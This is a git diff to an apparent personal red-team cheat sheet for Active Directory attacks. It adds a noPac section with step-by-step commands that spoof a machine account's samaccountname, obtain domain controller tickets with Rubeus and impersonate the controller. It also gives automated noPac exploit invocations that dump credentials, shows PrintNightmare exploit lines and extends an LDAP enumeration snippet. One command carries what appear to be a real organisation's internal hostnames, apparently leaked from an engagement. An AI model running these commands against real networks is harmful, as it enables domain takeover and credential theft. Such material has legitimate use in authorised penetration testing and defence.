@@ -57,6 +57,7 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 	* [ZeroLogon](#zerologon)
 	* [HiveNightmare](#hivenightmare)
 * **[PrintNightmare](#printnightmare)**
+* **[noPac](#nopac)**
 * **[PKI Abuse](#pki-abuse)**
 * **[File Transfer](#file-transfer)**
 * **[Reverse Shells](#reverse-shells)**
@@ -104,7 +105,14 @@ ACL/ACE | Object | Permission | Abuse | ScreenShot
 
 Example use:
 ```
-([adsisearcher]"<ldapfilter>").FindAll()
+# Current domain context
+([adsisearcher]"<ldap-filter>").FindAll()
+
+# Other domain context
+$adsiSearcherObj = [adsisearcher]""
+$adsiSearcherObj.SearchRoot = [ADSI]"LDAP://DC01/DC=legitcorp,DC=local"
+$adsiSearcherObj.Filter = "<ldap-filter>"
+$adsiSearcherObj.FindAll()
 ```
 _Note: These LDAP filters can be used with `[adsisearcher]` builtin function in powershell. Any extra commands can be found [here](https://mlcsec.com/active-directory-domain-enumeration-part-2). Amazing cheatsheet by [@mlcsec](https://twitter.com/mlcsec)_
 
@@ -568,6 +576,69 @@ SharpPrintNightmare.exe C:\Windows\Tasks\execme.dll
 smbserver.py smbshare `pwd` -smb2support
 python3 CVE-2021-1675.py testlab/testuser:'P@$$w0rd!'@10.10.10.10 '\\10.10.10.10\smbshare\encme.dll' [-hashes :NTLM]
 ```
+
+## noPac
+This exploit will require a valid domain user regardless the level of privilege given as long as it can create a computer account on the domain. Here are the steps.
+
+1. Create a fake computer with [Powermad.ps1](https://github.com/Kevin-Robertson/Powermad) script.
+```
+New-MachineAccount -MachineAccount "FakeComputer" -Password $password -Domain legitcorp.local -DomainController DC01.legitcorp.local -Verbose
+```
+
+2. Clear the fake computer's ServicePrincipalName (SPN) value
+```
+Set-DomainObject "CN=FakeComputer,CN=Computers,DC=legitcorp,DC=local" -Clear "serviceprincipalname" -Verbose -Domain legitcorp.local
+```
+
+3. Rename the fake computer samaccountname to domain controller name (FakeComputer$ -> DC01)
+```
+Set-MachineAccountAttribute -MachineAccount "FakeComputer" -Value "DC01" -Attribute samaccountname -Domain legitcorp.local -Verbose
+```
+
+4. Request a TGT of the domain controller
+```
+Rubeus.exe asktgt /user:DC01 /password:Password2 /domain:legitcorp.local /dc:DC01.legitcorp.local /nowrap
+```
+
+5. Rename the fake computer name to its original name (DC01 -> FakeComputer$)
+```
+Set-MachineAccountAttribute -MachineAccount "FakeComputer" -Value "FakeComputer" -Attribute samaccountname -Verbose -Domain legitcorp.local
+```
+
+6. Request TGS on behalf of the domain controller ticket we obtained previously.
+```
+Rubeus.exe s4u /impersonateuser:SGPWVADS01NTTDC$ /nowrap /dc:SGPWVADS01NTTDC.mbb.com.sg /self /altservice:ldap/SGPWVADS01NTTDC.mbb.com.sg /ptt /ticket:<base64-blob-ticket>
+```
+
+7. Perform cleanup (OPSEC Friendly)
+```
+Remove-MachineAccount -Domain legitcorp.local -MachineAccount FakeComputer
+```
+
+### Automated Exploit
+There are a few automated scripts and tools out there to perform this exploit. This are some of the tools that i use previously on an engagement.
+* Python (https://github.com/Ridter/noPac.git)
+```
+python3.exe .\noPac.py domain.local/lowpriv:Passw0rd -dc-ip 10.0.10.10 -dc-host DC01 --impersonate administrator -dump
+```
+
+* CSharp (https://github.com/cube0x0/noPac.git)
+```
+noPac.exe -domain domain.local -user low_priv -pass 'P@ssw0rd' /dc dc01.domain.local /mAccount FakeComputer /service [ldap,cifs,http] /ptt
+```
+
+Note: _Always perform cleanup if you are exploiting this against the corporate environment. You can use the following command to verify and remove a computer account_
+```
+# verify computer account with wmic
+wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_samaccountname
+
+# remove a computer account
+net computer \\FakeComputer /delete
+```
+
+
+### Reference 
+https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing
 
 ## PKI Abuse
 It is recommended to use below commands with `-k` option and .cacche file. Please refer [Request TGT](#request-tgt) section
